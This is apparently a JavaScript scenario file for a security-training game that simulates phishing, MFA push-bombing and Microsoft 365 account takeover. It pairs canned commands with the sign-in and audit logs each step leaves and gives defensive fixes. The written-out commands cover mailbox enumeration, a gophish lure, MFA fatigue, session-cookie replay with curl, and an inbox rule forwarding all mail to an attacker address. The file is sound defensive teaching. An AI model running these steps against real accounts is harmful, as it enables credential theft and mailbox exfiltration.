// Simulated engagement #4: the IDENTITY / CLOUD phase of the Halcyon Mutual assessment — a phishing campaign
// that leads to a Microsoft 365 account takeover. This is the path behind most real 2022-2024 intrusions
// (0ktapus, the Uber and MGM breaches): enumerate mailboxes, send a lure to one finance user, harvest the
// password on a lookalike sign-in page, get past MFA by push-bombing until they tap "approve", then sign in to
// M365 from your own machine and read the target's mailbox.
//
// Everything is fiction and canned, exactly like the other engagements. The tenant, users and the attacker's
// lookalike domain are *.example (RFC 2606); all addresses are RFC 5737 documentation IPs; commands are a fixed
// whitelist mapping to pre-written output; nothing is sent, nothing is executed, there is no lure text or
// payload here — only the ATT&CK technique and the blue-team log each move leaves. The SIEM is the real cloud
// identity stack: Entra ID sign-in logs (SigninLogs), the Microsoft Purview unified audit log (mailbox access),
// and a mail-gateway / proxy trace. logs(b, t, ctx) writes each move's trace keyed to the step so the SOC
// debrief can grade which line it was.
import { STAFF } from '../game/logkit.js';

export const PHISH_FLAG = 'FLAG{push-approved-the-phish}';
// The target: a finance / accounts-payable user, the kind who approves invoices and gets phished first.
const VICTIM = 'd.reyes@halcyon.example';
const VICTIM_IP = '203.0.113.10'; // Halcyon's office egress — the victim clicks the lure from their desk
// Attacker infrastructure: the AiTM / phishing host, and the IP the stolen session signs in from (a new country).
const ATK = { aitm: '198.51.100.88', signin: '203.0.113.88', host: 'operator' };
const FOREIGN = { city: 'Lagos', state: 'Lagos', country: 'NG', lat: 6.52, lon: 3.37 };
// A Monday-morning window, the identity phase of the engagement.
export const PHISH_DATE = { weekday: 'MON', name: 'Monday', month: 'Oct', day: 26, year: 2026, domain: 'halcyon.example', netbios: 'HALCYON' };

export const PHISH_ENGAGEMENT = {
  id: 'halcyon-phish-2026',
  name: 'Phishing & M365 takeover',
  client: 'Halcyon Mutual',
  title: 'Identity pentest: phishing to Microsoft 365 takeover',
  blurb: 'Take over a cloud account the way most real breaches start: find a valid mailbox, phish one finance user for their password, beat MFA by push-bombing until they approve, then sign in to Microsoft 365 and read their mail to reach the proof. 5 moves, recon → cloud account takeover.',
  seed: 8841,
  date: PHISH_DATE,
  attacker: { ip: ATK.signin, host: ATK.host },
  prompt: `${ATK.host}@kali:~/halcyon-phish$`,
  flag: PHISH_FLAG,
  noise: phishEngagementNoise,
  summary: 'The one-line report: a lookalike-domain lure harvested a finance user’s password, and ordinary push MFA was defeated by sending prompts until the user tapped approve (MFA fatigue). The stolen session signed in to Microsoft 365 from a new country and read the mailbox. Three fixes break the chain: phishing-resistant MFA (FIDO2 keys) or number-matching so a prompt can’t be tapped by reflex; Conditional Access that blocks sign-ins from unexpected locations and risky sessions; and mark-external-senders plus blocking newly-registered lookalike domains at the mail gateway. Entra and Purview already logged every step.',
  start: 10 * 3600 + 38 * 60, // 10:38, inside the agreed window
  roe: [
    'Authorised by Halcyon Mutual’s CISO as the identity / social-engineering phase, Monday Oct 26, 09:00–12:00. Simulated tenant and consenting test identities only.',
    'In scope: the halcyon.example Microsoft 365 tenant and a controlled lure to the agreed finance test user; proving access to that one mailbox.',
    'Objective: prove account takeover by reading the proof message the CISO planted in the target mailbox. Nothing else.',
    'Out of scope: reading, forwarding or exporting real mail or files, creating mailbox forwarding rules, touching any mailbox but the target, or establishing persistence.',
    'Stealth counts: Entra ID and Microsoft Purview watch sign-ins and mailbox access. Loud moves (mass lures, push bombing) show up as alerts in the debrief.',
  ],
  steps: [
    {
      id: 'recon',
      tactic: 'Reconnaissance',
      tid: 'T1589.002',
      tname: 'Gather Victim Identity Information: Email Addresses',
      goal: 'Find a valid mailbox to target — without a password, just by asking the login endpoint.',
      defend: 'The sign-in endpoint answers the same for real and fake accounts where possible; alert on user-enumeration patterns (many unknown-user / invalid results from one IP); enforce smart lockout.',
      choices: [
        {
          cmd: 'o365enum -d halcyon.example -U finance-shortlist.txt',
          label: 'Check a short list of likely finance addresses (quiet)',
          output: [
            'o365enum 2.3 :: tenant halcyon.example',
            '[+] d.reyes@halcyon.example      VALID   (accounts payable)',
            '[+] a.osei@halcyon.example       VALID   (finance)',
            '[-] payroll@halcyon.example      not found',
            '# The login endpoint answers differently for real vs fake accounts, so valid mailboxes leak with no password.',
            '# d.reyes approves invoices — the classic finance target. Pick them.',
          ],
        },
        {
          cmd: 'o365enum -d halcyon.example -U all-staff.txt',
          label: 'Enumerate the whole 412-name staff list (loud)',
          loud: true,
          output: [
            'o365enum 2.3 :: tenant halcyon.example :: wordlist all-staff.txt (412 names)',
            '[+] 263 valid mailboxes, 149 not found',
            '# 412 lookups in a few seconds from one address. Entra logged the enumeration pattern (see the debrief).',
          ],
        },
      ],
      logs(b, t, { loud }) {
        // Login-based enumeration: a valid user fails differently (50126) from one that does not exist (50034).
        b.signin(t, { upn: VICTIM, ip: ATK.aitm, errorCode: 50126, tenant: 'halcyon', client: 'Browser' }, { key: 'recon', attack: 'T1589.002' });
        b.signin(t + 3, { upn: 'payroll@halcyon.example', ip: ATK.aitm, errorCode: 50034, tenant: 'halcyon', client: 'Browser' }, { key: 'recon', attack: 'T1589.002' });
        if (loud) {
          const guesses = ['a.osei', 'r.doyle', 'p.ng', 's.ito', 'j.webb', 'm.vale'];
          guesses.forEach((u, i) =>
            b.signin(t + 6 + i, { upn: `${u}@halcyon.example`, ip: ATK.aitm, errorCode: i % 2 ? 50034 : 50126, tenant: 'halcyon', client: 'Browser' },
              { key: 'recon', attack: 'T1589.002', detection: i === 0 ? 'Entra: user-enumeration pattern — many 50034/50126 results from one IP within seconds' : undefined }));
        }
      },
    },
    {
      id: 'phish',
      tactic: 'Initial Access',
      tid: 'T1566.002',
      tname: 'Phishing: Spearphishing Link',
      goal: 'Get the password: send a lure with a link to a page that looks like the real sign-in, and catch what they type.',
      defend: 'Mark external senders, block newly-registered and lookalike domains at the gateway, and give staff a one-click "report phish" button; a clone-login domain is new and categorised as such by the proxy.',
      choices: [
        {
          cmd: 'gophish launch --template benefits-notice --to d.reyes@halcyon.example',
          label: 'One targeted lure to the finance user (quiet)',
          output: [
            'gophish :: campaign "benefits-notice" launched',
            '  to:   d.reyes@halcyon.example',
            '  from: hr@halcyon-benefits.example   (lookalike of halcyon.example)',
            '  link: https://account.halcyon-benefits.example/login   (clone of the real sign-in page)',
            '[*] 10:41  email delivered',
            '[*] 10:47  link clicked',
            '[*] 10:48  credentials submitted  ->  d.reyes : ********** captured',
            '# A believable lure to one user. You have the password now — not the second factor.',
          ],
        },
        {
          cmd: 'gophish launch --template benefits-notice --to all-staff@halcyon.example',
          label: 'Blast the lure to all 412 staff (loud)',
          loud: true,
          output: [
            'gophish :: campaign "benefits-notice" launched to all-staff (412)',
            '[*] 29 delivered, 11 quarantined by mail security',
            '[*] 3 link clicks, 1 credential set captured',
            '[!] 10:52  a recipient clicked "Report phishing" — the SOC now has your lure and domain.',
            '# Loud: spray everyone and someone reports you. One targeted lure would have stayed quiet.',
          ],
        },
      ],
      logs(b, t, { loud }) {
        b.add(t, 'mailgw01', 'mail', `mailgw: msg from=hr@halcyon-benefits.example to=${VICTIM} subject="Action required: 2026 benefits re-enrollment" spf=pass dkim=none dmarc=none verdict=delivered note=lookalike-domain`, { key: 'phish', attack: 'T1566.002' });
        b.add(t + 90, 'proxy01', 'proxy', `proxy: ${VICTIM_IP} GET https://account.halcyon-benefits.example/login category=newly-registered-domain action=allow`, { ip: VICTIM_IP, user: 'd.reyes', key: 'phish', attack: 'T1566.002' });
        b.add(t + 120, 'proxy01', 'proxy', `proxy: ${VICTIM_IP} POST https://account.halcyon-benefits.example/login bytes_out=412 category=newly-registered-domain action=allow`, { ip: VICTIM_IP, user: 'd.reyes', key: 'phish', attack: 'T1566.002' });
        if (loud) {
          b.add(t + 5, 'mailgw01', 'mail', `mailgw: campaign from=hr@halcyon-benefits.example recipients=412 delivered=29 quarantined=11 user_reported=1`, { key: 'phish', attack: 'T1566.002', detection: 'Mail security: lookalike-domain phishing campaign to 412 staff; 1 user-reported phish' });
        }
      },
    },
    {
      id: 'mfafatigue',
      tactic: 'Credential Access',
      tid: 'T1621',
      tname: 'Multi-Factor Authentication Request Generation',
      goal: 'Beat MFA with no code: replay the password to trigger approval prompts until the user taps "approve".',
      defend: 'Number-matching MFA so a prompt can’t be tapped by reflex, and push throttling; alert on repeated MFA prompts/denials; phishing-resistant FIDO2 keys stop this entirely.',
      choices: [
        {
          cmd: 'mfafatigue --user d.reyes@halcyon.example --prompts 1',
          label: 'Send one prompt, timed to look like their own login (quiet)',
          output: [
            'mfafatigue :: user d.reyes@halcyon.example  prompts=1',
            '[*] replaying the captured password to start a sign-in...',
            '[*] Microsoft Authenticator push sent to the user’s phone',
            '[*] 10:55  push APPROVED',
            '# One well-timed prompt, while they were already working, got tapped out of habit. You are past MFA.',
          ],
        },
        {
          cmd: 'mfafatigue --user d.reyes@halcyon.example --prompts 15',
          label: 'Push-bomb: a prompt every 8 seconds until they give in (loud)',
          loud: true,
          output: [
            'mfafatigue :: user d.reyes@halcyon.example  prompts=15',
            '[*] firing a push every 8 seconds until approval...',
            '[*] prompts 1–14 denied',
            '[*] 10:58  prompt 15 APPROVED (the user gave up)',
            '# 15 prompts in two minutes is textbook push-bombing. Number-matching would have stopped it — and alerted.',
          ],
        },
      ],
      logs(b, t, { loud }) {
        const n = loud ? 15 : 1;
        for (let i = 0; i < n; i++) {
          b.signin(t + i * 8, { upn: VICTIM, ip: ATK.signin, errorCode: 50074, app: 'Office 365 Exchange Online', client: 'Browser', mfa: true, tenant: 'halcyon', geo: FOREIGN },
            { key: 'mfafatigue', attack: 'T1621', detection: loud && i === 0 ? 'Entra: 15 MFA prompts for d.reyes in two minutes then an approval — MFA fatigue / push bombing' : undefined });
        }
      },
    },
    {
      id: 'signin',
      tactic: 'Initial Access',
      tid: 'T1078.004',
      tname: 'Valid Accounts: Cloud Accounts',
      goal: 'Use the approved session: sign in to Microsoft 365 as the victim, from your own machine.',
      defend: 'Conditional Access that blocks sign-ins from unexpected countries and risky sessions; alert on first sign-in from a new location; bind the session to a compliant device.',
      choices: [
        {
          cmd: 'curl -s --cookie ESTSAUTH=<captured> https://outlook.halcyon.example/owa/',
          label: 'Load the victim’s mailbox with the stolen session',
          prompt: `${ATK.host}@kali:~/halcyon-phish# (d.reyes)`,
          output: [
            'HTTP/2 200  (mailbox loaded)',
            'X-OWA-UserPrincipalName: d.reyes@halcyon.example',
            '# Signed in to Microsoft 365 as the victim, from your own machine — MFA is already satisfied.',
            '# To Entra this is a sign-in for d.reyes from a new country (NG). High risk (see the debrief).',
          ],
        },
      ],
      logs(b, t) {
        b.signin(t, { upn: VICTIM, ip: ATK.signin, errorCode: 0, app: 'Office 365 Exchange Online', client: 'Browser', mfa: true, tenant: 'halcyon', geo: FOREIGN, risk: 'high', riskState: 'atRisk', riskEvents: ['unfamiliarFeatures'] },
          { key: 'signin', attack: 'T1078.004', detection: `Entra: successful sign-in for ${VICTIM} from ${FOREIGN.country} (${ATK.signin}) — impossible travel, risk=high` });
        b.ual(t + 2, { op: 'UserLoggedIn', user: VICTIM, ip: ATK.signin, type: 'AzureActiveDirectoryStsLogon', workload: 'AzureActiveDirectory', objectId: 'Office 365 Exchange Online' },
          { key: 'signin', attack: 'T1078.004' });
      },
    },
    {
      id: 'collect',
      tactic: 'Collection',
      tid: 'T1114.002',
      tname: 'Email Collection: Remote Email Collection',
      goal: 'Prove takeover the way the rules allow: find and read the proof message in the mailbox. Nothing else.',
      defend: 'Alert on mailbox access from a risky session; alert on any new external auto-forwarding rule; apply DLP to outbound mail.',
      objective: true,
      choices: [
        {
          cmd: 'curl -s --cookie ESTSAUTH=<captured> "https://outlook.halcyon.example/owa/search?q=engagement+proof"',
          label: 'Search the mailbox for the planted proof message',
          output: [
            'HTTP/2 200',
            '=== Inbox search: "engagement proof" (1 result) ===',
            'From:    CISO office <ciso@halcyon.example>',
            'Subject: ENGAGEMENT PROOF — do not action, do not forward',
            'Body:    If this is being read from d.reyes’ mailbox, a phish plus MFA fatigue got you in.',
            `         Proof token: ${PHISH_FLAG}`,
            '# Account takeover proven. Objective reached — stop here and write it up.',
          ],
        },
        {
          cmd: 'New-InboxRule -Mailbox d.reyes -ForwardTo exfil@halcyon-benefits.example -All',
          label: 'Add a rule that auto-forwards all their mail to you',
          violation: true,
          output: [
            'STOPPED by the rules of engagement.',
            'An external auto-forwarding rule would exfiltrate the victim’s real mail — customer and employee data —',
            'and set up persistence. That is out of scope: you have already proven takeover by reading the planted note.',
            'Prove access, never take the data. Strike recorded.',
          ],
        },
      ],
      logs(b, t) {
        b.ual(t, { op: 'MailItemsAccessed', user: VICTIM, ip: ATK.signin, type: 'ExchangeItemAggregated', workload: 'Exchange', objectId: 'Inbox' },
          { key: 'collect', attack: 'T1114.002', detection: 'Purview: mailbox items accessed by a high-risk session from a new IP' });
        b.ual(t + 2, { op: 'SearchQueryInitiatedExchange', user: VICTIM, ip: ATK.signin, type: 'ExchangeItemAggregated', workload: 'Exchange', objectId: 'engagement proof' },
          { key: 'collect', attack: 'T1114.002' });
      },
    },
  ],
};

/** Ordinary Monday-morning cloud traffic, so the attack has a haystack of normal sign-ins and mailbox access. */
export function phishEngagementNoise(b, start, end) {
  const { r } = b;
  const staff = Object.keys(STAFF);
  for (let t = start - 700; t < end; t += 9 + Math.floor(r() * 36)) {
    const u = staff[Math.floor(r() * staff.length)];
    const ip = r() < 0.7 ? VICTIM_IP : `198.51.100.${20 + Math.floor(r() * 40)}`; // office egress or home broadband
    b.signin(t, { upn: `${u}@halcyon.example`, ip, app: r() < 0.5 ? 'Office 365 Exchange Online' : 'Microsoft Teams', client: r() < 0.5 ? 'Browser' : 'Mobile Apps and Desktop clients', mfa: true, tenant: 'halcyon' }, { noise: true });
  }
  for (let t = start - 500; t < end; t += 40 + Math.floor(r() * 90)) {
    const u = staff[Math.floor(r() * staff.length)];
    const sp = r() < 0.5;
    b.ual(t, { op: sp ? 'FileAccessed' : 'MailItemsAccessed', user: `${u}@halcyon.example`, ip: VICTIM_IP, type: sp ? 'SharePointFileOperation' : 'ExchangeItemAggregated', workload: sp ? 'SharePoint' : 'Exchange', objectId: sp ? '/sites/claims/Shared Documents' : 'Inbox' }, { noise: true });
  }
}
